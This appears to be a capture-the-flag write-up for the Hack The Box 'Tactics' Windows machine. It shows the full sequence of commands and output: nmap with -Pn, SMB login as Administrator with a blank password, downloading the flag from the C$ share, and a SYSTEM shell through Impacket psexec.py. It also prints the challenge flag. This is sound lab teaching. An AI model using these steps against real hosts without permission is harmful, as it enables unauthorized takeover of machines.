---
title: "HTB Tactics"
date: 2026-07-16
tags: [htb, very-easy, windows, smb, psexec, default-creds, impacket]
platform: htb
description: "A Windows box with nothing but SMB open. The Administrator account has no password — log straight into the C$ share and grab the flag."
outline: [2, 3]
---

# HTB Tactics

Very Easy Starting Point box, and this one is about as bare as it gets — a Windows machine with only SMB exposed and an Administrator account that has **no password at all**. Once you figure that out, you can either browse the admin share and pull the flag, or go one better and drop into a full command shell on the box with `psexec.py`. I did both, because the second way is a genuinely useful technique to have in the toolbox.

## Recon

Ran the usual nmap and immediately hit a wall:

```bash
nmap -sV -sC 10.129.33.147
```

```
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
```

nmap decided the host was down. It isn't — Windows boxes commonly drop the ICMP ping that nmap uses to check if a target is alive, so nmap gives up before it even scans. The fix is right there in the hint: `-Pn` tells nmap to skip the ping check and just scan anyway.

```bash
nmap -Pn -sV -sC 10.129.33.147
```

```
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Three ports, all of them the classic Windows file-sharing stack: 135 (RPC), 139 (NetBIOS), and **445 (SMB)**. SMB is the one worth poking at.

::: tip When nmap says "host seems down"
On Windows targets this almost always means the firewall is dropping ping, not that the box is actually offline. Reach for `-Pn` before assuming the IP is wrong.
:::

## Enumeration — SMB logins

With SMB open, the first question is always: what can I log in as without credentials? I worked through the usual suspects — anonymous, `guest`, then `Administrator`.

Guest got rejected:

```bash
smbclient //10.129.33.147/Shares -N -U guest
# session setup failed: NT_STATUS_LOGON_FAILURE
```

Then I tried listing shares as `Administrator` — and when it prompted for a password, I just hit **Enter** with nothing typed:

```bash
smbclient -L //10.129.33.147 -U Administrator
# Password for [WORKGROUP\Administrator]:      <-- pressed Enter, no password
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

That worked. The Administrator account has a blank password — and the fact that `C$` and `ADMIN$` show up means I'm authenticated as a full admin, since those are hidden administrative shares normal users can't see.

::: tip Handy tool: smbmap
`smbmap -H <ip> -u Administrator -p ''` does the same enumeration but also prints your **read/write permissions** on each share in one shot — a bit more informative than `smbclient -L` when you're sizing up what you can touch.
:::

## Getting the flag — via the C$ share

`C$` is the entire `C:` drive shared out. Since I can read it as admin, I don't need a shell at all — I can just connect and walk to where HTB keeps the flag:

```bash
smbclient //10.129.33.147/C$ -U Administrator
# password: (blank, hit Enter)
smb: \> cd Users\Administrator\Desktop
smb: \> get flag.txt
```

`get flag.txt` pulls it down to my machine:

```
f751c19eda8f61ce81827e6930a1f40c
```

That's the box done. But there's a cleaner, more powerful way in that's worth learning.

## Better way — a full shell with psexec.py

`psexec.py` (from the Impacket toolkit) uses those same admin credentials to give you an actual **command prompt on the target**, not just file access. It works by uploading a service binary to the `ADMIN$` share, registering it as a Windows service, and starting it — which runs it as `SYSTEM`.

The syntax puts the username before a `:@` with nothing between them, meaning "empty password":

```bash
psexec.py Administrator:@10.129.33.147
```

```
[*] Requesting shares on 10.129.33.147.....
[*] Found writable share ADMIN$
[*] Uploading file nClwtWtD.exe
[*] Opening SVCManager on 10.129.33.147.....
[*] Creating service QaCE on 10.129.33.147.....
[*] Starting service QaCE.....
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Now I've got an interactive shell. One thing that tripped me up for a second — this is a Windows prompt, so Linux muscle memory doesn't apply:

```
C:\Windows\system32> ls
'ls' is not recognized as an internal or external command
C:\Windows\system32> dir      <-- 'dir' is the Windows equivalent
```

From here you can `cd` to the Desktop and `type flag.txt` to read the same flag.

## Flag

`f751c19eda8f61ce81827e6930a1f40c` — from `C:\Users\Administrator\Desktop\flag.txt`.

The lesson I'm keeping from this one: when SMB is open, always test `Administrator` with a blank password before anything fancier — and `psexec.py` is the go-to for turning admin SMB creds into a real shell. Both of those come up constantly on Windows boxes.
